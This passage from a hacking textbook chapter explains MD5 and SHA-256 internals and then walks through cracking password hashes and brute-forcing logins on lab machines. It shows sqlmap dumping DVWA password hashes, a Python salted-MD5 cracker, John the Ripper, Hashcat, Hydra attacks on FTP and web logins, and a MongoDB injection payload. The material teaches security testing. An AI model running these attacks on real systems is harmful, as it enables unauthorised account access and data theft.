		<p class="indent">The <span class="ent">⊞</span> symbols represent modulo addition, which is equivalent to adding two numbers and then computing the result modulo of some number <em>n</em>. If <em>n</em> is 7, then 6 <span class="ent">⊞</span> 3 is 2. The &lt;&lt;&lt; symbol represents a circular left shift and <em>s<sub>i</sub></em> represents the shift amount. The output of function <em>K</em> is used to override the value of the <em>A</em> block, and the blocks are rearranged by performing a circular right shift, as shown in <a href="ch12.xhtml#ch12fig3">Figure 12-3</a>. The resulting 128 bits are then fed back into the whole system for a total of 16 iterations, one for each 32-bit segment in the original 512-bit message (16 <em>×</em> 32 = 512).</p>
		<p class="indent">The block described here is just one of the four blocks used by the MD5 hash function. The data pass through all four blocks in a given round. <a href="ch12.xhtml#ch12fig4">Figure 12-4</a> shows how all four blocks are combined.</p>
		<div class="image" id="ch12fig4">
			<img alt="image" src="../images/ch12fig04.jpg"/>
		</div>
		<p class="figcap"><em>Figure 12-4: Combining the four blocks of the MD5 algorithm</em></p>
		<p class="indent">Each block follows the same general structure. The only exception is that each block uses a specific function. These functions are as follows:</p>
		<p class="center"><em>H</em>(<em>B</em>, <em>C</em>, <em>D</em>) = <em>B</em> <strong>xor</strong> <em>C</em> <strong>xor</strong> <em>D</em></p>
		<p class="center"><em>G</em>(<em>B</em>, <em>C</em>, <em>D</em>) = (<em>B</em> <strong>and</strong> <em>D</em>) <strong>or</strong> (<em>C</em> <strong>and</strong> ( <strong>not</strong> <em>D</em>))</p>
		<p class="center"><em>I</em>(<em>B</em>, <em>C</em>, <em>D</em>) = <em>C</em> <strong>xor</strong> (<em>B</em> <strong>or</strong> ( <strong>not</strong> <em>D</em>))</p>
		<p class="indent">If the message is longer that 448 bits, the initialization vector of the next block is calculated by computing block <em>I</em>’s output chunks: <em>A</em>, <em>B</em>, <em>C</em>, and <em>D</em> addition modulo 32 the chunks of the original initialization vector. The final 128-bit Initialization vector is the MD5 hash.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_259"/>Even after all this mixing, in 1993, Antoon Bosselaers and Bert den Boer discovered that MD5 doesn’t meet the no-collision property of hashes, because it’s possible to generate two messages with the same hash. Because of this, the MD5 algorithm is no longer secure and shouldn’t be used when building cryptographic systems. Not to worry: other hash algorithms such as SHA-256, SHA-512, and SHA-3 are still considered secure. <a href="ch12.xhtml#ch12fig5">Figure 12-5</a> shows the general architecture of the SHA-256 hash function. The C function represents the compression function, which can be described using a similar diagram and language as <a href="ch12.xhtml#ch12fig3">Figure 12-3</a>.</p>
		<div class="image" id="ch12fig5">
			<img alt="image" src="../images/ch12fig05.jpg"/>
		</div>
		<p class="figcap"><em>Figure 12-5: The SHA-256 hash function</em></p>
		<h4 class="h4" id="ch12lev11"><strong><em>Cracking Hashes</em></strong></h4>
		<p class="noindent">How can we crack a password hash to recover the original password? Secure hash functions are one-way functions, so we can’t directly reverse engineer the hash. But all is not lost; we just have to be clever.</p>
		<p class="indent">Recall that each password will generate a unique hash, so two matching hashes must share the same plaintext password. Therefore, if we want to crack a specific hash, we should compute the hash of many known passwords and compare the resulting hashes to our original hash. If we find a match, the plaintext password we just hashed must be the same as the plaintext password of the hash we’re trying to crack. This type of attack is called a dictionary-based attack, and it’s the same strategy we used earlier to discover files on a server. Let’s use a dictionary-based attack to crack some of the password hashes in the database on the Metasploitable virtual machine.</p>
		<p class="indent">Reopen the terminal containing the SQLmap session and use the following command to dump the usernames and passwords from the user table in the Damn Vulnerable Web App (DVWA) database. This SQLmap command will perform a dictionary-based attack to try to crack the password hashes in the database:</p>
		<pre>sqlmap-shell&gt; <span class="codestrong1">-D dvwa -T users -C user,password --dump</span><br/><br/>do you want to store hashes to a temporary file for eventual further<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 processing with other tools [y/N] <span class="codestrong1">y</span><br/>do you want to crack them via a dictionary-based attack? [Y/n/q] <span class="codestrong1">Y</span><br/>
[18:08:22] [INFO] using hash method 'md5_generic_passwd'<br/><br/><span epub:type="pagebreak" id="page_260"/>Database: dvwa<br/>Table: users<br/>
[5 entries]<br/>
+---------+---------------------------------------------+<br/>
| user    | password                                    |<br/>
+---------+---------------------------------------------+<br/>
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |<br/>
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |<br/>
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |<br/>
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |<br/>
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |<br/>
+---------+---------------------------------------------+</pre>
		<p class="indent">In this case, the dictionary-based attack was able to crack all the passwords in the dictionary.</p>
		<p class="indent">Of course, dictionary-based attacks will succeed only if the passwords in the database are also in the predefined list of passwords. A good password list is critical to the hash cracking process. <em>SecLists</em>, an excellent collection of security lists, contains several password lists that you can use for your dictionary-based attacks. For example, the <em>10-million-password-list-top-1000000.txt</em> contains a whopping one million passwords. SecLists also has password lists in other languages, such as French, Dutch, and German. The SecLists collection contains payloads like zipbombs and webshells, and entries that can be used as test data in fuzzing attacks. <em>Zipbombs</em> are small, compressed files that become really large when decompressed. You could make your own zipbomb by compressing a large file containing zeros. <em>Webshells</em> are shells that allow you to control a server from a web page.</p>
		<p class="indent">You can clone the SecLists Git repository to your Kali Linux desktop by running the following command:</p>
		<pre>kali@kali:~/Desktop$ <span class="codestrong1">git clone https://github.com/danielmiessler/SecLists</span></pre>
		<h4 class="h4" id="ch12lev12"><strong><em>Salting Hashes with a Nonce</em></strong></h4>
		<p class="noindent">If two users have the same password, both passwords will produce the same hash. This leaks information because it allows a hacker with access to the database to know that two users have the same password. Also, as you just discovered, hackers can figure out the value of a password if they happen to hash the same text. For this reason, developers often prepend a nonce to a password before hashing it. This nonce is commonly called a <em>salt</em>. The salt is prepended to the password and the resulting string is hashed and stored in the database. The original salt is also stored in a separate column.</p>
		<h3 class="h3" id="ch12lev13"><strong>Building a Salted Hash Cracker</strong></h3>
		<p class="noindent">It’s time to write our own hash cracking tool. Our hash cracker will prepend the salt pulled from a database to a plaintext password and compute the <span epub:type="pagebreak" id="page_261"/>hash of the result. It will then compare the resulting hash to the hash being cracked. We’ll repeat this process for each password in the dictionary until a match is found. Create a new file called <em>myHashCracker.py</em> in the <em>HashCrack</em> folder on your Kali Linux desktop and copy the following into it:</p>
		<pre>import hashlib<br/><br/>def crack_MD5_Hash(hash_to_crack, salt, dictionary_file):<br/>
    file = open(dictionary_file, "r")<br/>
 <span class="ent">➊</span> for password in file:<br/>
        salted_password = (salt + password.strip("\n")).encode('UTF-8')<br/>
        if hashlib.md5(salted_password).hexdigest() == hash_to_crack:<br/>
         <span class="ent">➋</span> return password<br/>
    return None<br/><br/><span class="ent">➌</span> hash_to_crack = 'c94201dbba5cb49dc3a6876a04f15f75'<br/>
   salt = 'd6a6bc0db10694a2d90e3a69648f3a03'<br/>
   dict = "/home/kali/Desktop/SecLists/Passwords/darkweb2017-top10000.txt"<br/><br/>
   password = crack_MD5_Hash(hash_to_crack, salt, dict)<br/>
   print(password)</pre>
		<p class="indent">This program will loop through all the passwords in the supplied dictionary <span class="ent">➊</span> and compute the hash of the salt and password combined. If the result matches the supplied hash, the program will return the plaintext password <span class="ent">➋</span>. However, if the hash doesn’t match, it will try the next password in the dictionary. The process will continue until until a match is found or until every password in the dictionary has been checked. If no match is found, the program will return <code>None</code>.</p>
		<p class="indent">Run the Python script to crack the hash, which we hardcoded in our script <span class="ent">➌</span>:</p>
		<pre>kali@kali:~/Desktop/HashCrack$ <span class="codestrong1">python3 myHashCracker.py</span><br/>trustno1</pre>
		<p class="indent">Once the script completes, it should print out the password <code>trustno1</code>.</p>
		<h3 class="h3" id="ch12lev14"><strong>Popular Hash Cracking and Brute-Forcing Tools</strong></h3>
		<p class="noindent">Other hackers have already built some useful hash cracking tools, many of which come preinstalled on Kali Linux. For example, <em>John the Ripper</em> is a large community project that can crack multiple types of hashes.</p>
		<h4 class="h4" id="ch12lev15"><strong><em>John the Ripper</em></strong></h4>
		<p class="noindent">Let’s use John the Ripper to crack the following hash, which you should save to a text file:</p>
		<pre><span epub:type="pagebreak" id="page_262"/>kali@kali:~/Desktop/HashCrack$ <span class="codestrong1">echo 8</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">afcd5cc09a539fe6811e43ec75722de24d85840d2c03333d3e489f56e6aa60f &gt; hashes.txt</span></pre>
		<p class="indent">Run the following command to start to start the cracking process.</p>
		<pre>kali@kali:~/Desktop/HashCrack$ <span class="codestrong1">sudo john --format=raw-sha256 --wordlist="/home/kali/Desktop/</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">SecLists/Passwords/Leaked-Databases/000webhost.txt" hashes.txt</span><br/>Using default input encoding: UTF-8</pre>
		<p class="indent">When the process completes, you can run the following command to view the list of cracked passwords:</p>
		<pre>kali@kali:~/Desktop/HashCrack$ <span class="codestrong1">sudo john --format=raw-sha256 --show hashes.txt</span><br/>
?:trustno1<br/>
1 password hash cracked, 0 left</pre>
		<h4 class="h4" id="ch12lev16"><strong><em>Hashcat</em></strong></h4>
		<p class="noindent">Another useful hash cracking tool, <em>Hashcat</em>, includes optimizations that allow you to perform dictionary attacks more rapidly. For example, Hashcat parallelizes the process so that the software can take advantage of special hardware like <em>Graphics Processing Units (GPUs)</em> that can run many operations simultaneously.</p>
		<p class="indent">However, because of these optimizations, running Hashcat in a virtual machine may result in an illegal instruction error. Therefore, you’ll need to install and run it outside of your virtual lab environment. It’s common practice among serious hackers to build special password-cracking machines with powerful processors and GPUs.</p>
		<p class="indent">Let’s use Hashcat to crack the <em>hashes.txt</em> file:</p>
		<pre>hashcat -a 0 -m 1400 hashes.txt ~/Desktop/SecLists/Passwords/darkweb2017-top10000.txt</pre>
		<p class="indent">The <code>-a</code> flag represents the attack mode, or strategy, used to crack the hash. You can view possible attack modes by using the <code><strong>--help</strong></code> flag:</p>
		<pre>kali@kali$<span class="codestrong1">hashcat --help</span><br/><br/>
  # | Mode<br/>
 ===+======<br/>
  0 | Straight<br/>
  1 | Combination<br/>
  3 | Brute-force<br/>
  6 | Hybrid Wordlist + Mask<br/>
  7 | Hybrid Mask + Wordlist</pre>
		<p class="indent">Option <code>0</code>, <code>Straight</code> mode (the mode we’ve used here), simply tries each word in the dictionary until it finds a match. Option <code>1</code>, <code>Combination</code> mode, tries multiple combinations of different words. For example, it might combine the password <em>fire</em> with the password <em>walker1</em> to produce the password <span epub:type="pagebreak" id="page_263"/><em>firewalker1</em>. Option <code>3</code>, <code>Brute-force</code> mode, will try every possible combination until it discovers the password. For example, the tool might try the values <em>a</em>, <em>aa</em>, <em>ab</em>, and so on.</p>
		<p class="indent">To reduce the number of combinations Hashcat must test, you can supply a mask. A <em>mask</em> is a pattern that defines the password’s structure. For example, the pattern <code>?u?l?l?d?s</code> specifies a five-letter password. The <code>?u</code> indicates that the password starts with an uppercase letter. This uppercase letter is followed by two lowercase letters (<code>?l</code>) and the pattern ends with a digit (<code>?d</code>) followed by a symbol (<code>?s</code>). As a result, this mask might test the password <code>Bas5!</code>.</p>
		<p class="indent">The <code>-m</code> (or mode) option represents the algorithm used to create the hash. You can view a complete list of available modes by running <code>hash -h</code> in the terminal. The following is a snippet of some of the available modes:</p>
		<pre>       # | Name                      | Category<br/>
   ======+===========================+====================================<br/>
       0 | MD5                       | Raw Hash<br/>
 <span class="ent">➊</span> 1400 | SHA2-256                  | Raw Hash<br/>
      10 | md5($pass.$salt)          | Raw Hash, Salted and/or Iterated<br/>
 <span class="ent">➋</span> 1420 | sha256($salt.$pass)       | Raw Hash, Salted and/or Iterated</pre>
		<p class="indent">Mode <code>1400</code> represents a hash calculated using the SHA2-256 algorithm <span class="ent">➊</span>, whereas mode <code>1420</code> represents a hashing algorithm that first appends a salt to password before running it through SHA2-256 <span class="ent">➋</span>. A hashing algorithm can run for multiple iterations, using the output of each previous run as input for the next one. For example, mode <code>2600 md5(md5($pass))</code> computes the MD5 hash twice. This iteration value is normally stored in the database. Hashcat supports a fixed number of iterations with its predefined modes, but tools like <em>MDXfind</em> support an arbitrary number of iterations. The best way to store passwords is to salt them and then hash them for multiple iterations with a secure hash function like SHA-3, or better yet, a memory-hard function like scrypt or Argon 2i.</p>
		<h4 class="h4" id="ch12lev17"><strong><em>Hydra</em></strong></h4>
		<p class="noindent">After you’ve recovered usernames and passwords, what can you do with them? You could try to use them to log in to services like FTP or SSH. Here, we look at <em>Hydra</em>, an invaluable tool that automates the process of attempting to log in to a service using username and password pairs from a list.</p>
		<p class="indent">Practice using Hydra to break into your Metasploitable virtual machine through its FTP server. FTP allows users to upload files to a server. You can use the default usernames and passwords in the <em>ftp-betterdefaultpasslist.txt</em> list, which is a part of SecLists. The following is a copy of the complete list:</p>
		<pre>anonymous:anonymous<br/>root:rootpasswd<br/>root:12hrs37<br/>ftp:b1uRR3<br/><span epub:type="pagebreak" id="page_264"/>admin:admin<br/>localadmin:localadmin<br/>admin:1234</pre>
		<p class="indent">Files in SecLists aren’t always this short. In fact, the FTP default password list is one of shortest lists in the SecLists collection, which makes it a great candidate for demonstrating this type of attack. The longer the list, the more time it will take to run.</p>
		<p class="indent">Run Hydra using the following command; the IP address <code>192.168.1.101</code> represents the IP address of the Metasploitable server:</p>
		<pre>kali@kali:~/Desktop/HashCrack$ <span class="codestrong1">hydra -C ~/Desktop/SecLists/Passwords/Default-</span><br/><img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">Credentials/ftp-betterdefaultpasslist.txt 192.168.1.101 ftp</span><br/><br/>
[21][ftp] host: 192.168.1.101   login: ftp         password: b1uRR3<br/>
[21][ftp] host: 192.168.1.101   login: anonymous   password: anonymous<br/>
[21][ftp] host: 192.168.1.101   login: ftp         password: ftp</pre>
		<p class="indent">The output shows three FTP accounts on the server that are using default login credentials. Now you could use the FTP server to, for example, upload an implant. Try a similar approach to access SSH accounts.</p>
		<h3 class="h3" id="ch12lev18"><strong>Exercises</strong></h3>
		<p class="noindent">These exercises will broaden your understanding of the ideas discussed in this chapter. In the first exercise, we’ll discuss NoSQL injection techniques. Then, we’ll examine how you can use tools like Hydra to automate the process of brute forcing passwords. We’ll conclude by discussing Burp Suite and its proxy, which allow you to intercept and modify web requests and responses.</p>
		<h4 class="h4" id="ch12lev19"><strong><em>NoSQL Injection</em></strong></h4>
		<p class="noindent">NoSQL databases are an alternative to databases that use SQL. Instead of storing data in tables, these databases store data in objects called documents, which are organized into collections. There is no standard query language for NoSQL databases, hence the name. Instead, each NoSQL platform (which includes MongoDB and Firebase) uses its own syntax and protocol. For this reason, programmers often rely on libraries to interface with these systems.</p>
		<p class="indent">Let’s look at an example of a Python library that interfaces with the MongoDB NoSQL database. The following Python program takes a social security number <code>POST</code>-ed by an HTTP form and uses the <code>pymongo</code> Python library to query a MongoDB database:</p>
		<pre>   import pymongo<br/><br/><span class="ent">➊</span> db_client = pymongo.MongoClient("mongodb://localhost:27017/")<br/><span class="ent">➋</span> databases = db_client["company_database"]<br/><br/><br/><span epub:type="pagebreak" id="page_265"/><span class="ent">➌</span> def getUserInfo(post_ssn):<br/>
       collection = databases["customers"]<br/>
    <span class="ent">➍</span> query = { "SSN": "+post_ssn+" }<br/>
       doc = collection.find(query)<br/>
       return doc</pre>
		<p class="indent">We connect to the MongoDB database running on port <code>27017</code> <span class="ent">➊</span>. (Default installations of MongoDB aren’t password protected.) Next, we select the database we want to query <span class="ent">➋</span>. Then, we define a function called <code>getUserInfo</code> <span class="ent">➌</span>. This function takes the social security number from the form’s <code>POST</code> request and uses it to query the customer collection for the users information at <span class="ent">➍</span>. MongoDB queries are represented as key–value pairs with the following syntax: <code>collection.find({"key":"value"})</code>. In <code>{"SSN": "+post_ssn+""}</code>, the social security number is the value in the <code>SSN</code> field posted from the form (<code>post_ssn</code>).</p>
		<p class="indent">As we did with SQL databases, we can inject information into the NoSQL database that changes the meaning of the query. For example, imagine we provided the following input to the <code>POST</code> form: <code>{$ne: ""}</code>. This would result in the following query:</p>
		<pre>{"SSN": {$ne:""}}</pre>
		<p class="indent">The <code>ne</code> operator means <em>not equal to</em> in MongoDB, so the query now returns all data for users whose <code>SSN</code> field isn’t empty.</p>
		<p class="indent">In addition to reading data, you could also inject your own data, or even code, into the database. Tools like to <em>NoSQLMap</em> automate the process of exploiting NoSQL databases. You can obtain a copy of NoSQLMap by visiting its GitHub page at <em><a href="https://github.com/codingo/NoSQLMap/">https://github.com/codingo/NoSQLMap/</a></em>. Practice using it to see what you can uncover.</p>
		<h4 class="h4" id="ch12lev20"><strong><em>Brute-Forcing Web Logins</em></strong></h4>
		<p class="noindent">In this chapter, we used dictionary-based attacks to crack a hash and log in to an FTP server. You can also use dictionary-based attacks to log in to a web app by trying all the usernames and passwords in some list. You might try achieving this by submitting multiple HTTP requests containing user login data.</p>
		<p class="indent">Hydra makes it possible for you to automate this process. Run the following command to send HTTP requests that contain the usernames and passwords in <em>darkweb2017-top100.txt</em> to the login form in Mutillidae:</p>
		<pre>kali@kali:<span class="codestrong1">~$hydra -l <span class="codeitalic">&lt;USERNAME&gt;</span> -P ~/Desktop/SecLists/Passwords/darkweb2017-</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">top100.txt 192.168.1.101 http-get-form "/mutillidae/index.php?page=</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">user-info.php&amp;:username=^USER^&amp;password=^PASS^&amp;: Error: Bad user name</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">or password"</span></pre>
		<p class="indent">First, specify the URL of the web app. Hydra uses colons to separate options. Next, specify the query string parameters that contain the data the user entered. Here, we submit multiple requests with different values for the <span epub:type="pagebreak" id="page_266"/>username and password parameters. Use the (<code>^USER^</code>) and (<code>^PASS^</code>) placeholders to indicate where Hydra should insert the username and password in the URL. Lastly, you must specify the error message that will be contained in the HTTP response if the login attempt fails.</p>
		<p class="indent">Run the command to see what usernames and passwords Hydra discovers. After you’ve had some practice with Hydra, see if you can gain access to the PostgreSQL server on the Metasploit machine.</p>
		<h4 class="h4" id="ch12lev21"><strong><em>Burp Suite</em></strong></h4>
		<p class="noindent">Injection attacks frequently require that you modify HTTP requests. Let’s try using a tool that makes this process easier. The free community edition of Burp Suite provides a GUI that allows you to quickly modify HTTP requests and responses sent and received by your browser. This is possible because Burp Suite acts as a proxy between the browser and the server. Each HTTP message your browser sends or receives first passes through Burp Suite.</p>
		<p class="indent">By default, the browser on Kali Linux isn’t configured to send web requests through a proxy, but you can configure Firefox to use your proxy by opening its preferences and searching for <strong>Network Settings</strong> (<a href="ch12.xhtml#ch12fig6">Figure 12-6</a>).</p>
		<div class="image" id="ch12fig6">
			<img alt="image" src="../images/ch12fig06.jpg"/>
		</div>
		<p class="figcap"><em>Figure 12-6: Configuring the Firefox setting that will route traffic through Burp Suite</em></p>
		<p class="indent">Once you’ve configured the browser, generate some web traffic by visiting <em><a href="http://cs.virginia.edu/">http://cs.virginia.edu/</a></em>. Burp Suite will intercept the request and you can view it by clicking the <strong>Proxy</strong> and <strong>Intercept</strong> tabs, at 1 and 2, respectively, in <a href="ch12.xhtml#ch12fig7">Figure 12-7</a>.</p>
		<div class="image" id="ch12fig7">
			<span epub:type="pagebreak" id="page_267"/>
			<img alt="image" src="../images/ch12fig07.jpg"/>
		</div>
		<p class="figcap"><em>Figure 12-7: Burp Suite’s capture of the HTTP request for</em> cs.virginia.edu</p>
		<p class="indent">After Burp Suite has captured a request, you can modify it or forward it to the web server unchanged. You can also send the request or response to another Burp Suite tab for future analysis. Explore Burp Suite to become familiar with using its features and then try modifying an HTTP request to execute a basic SQL injection attack.<span epub:type="pagebreak" id="page_268"/></p>
	</body>
</html>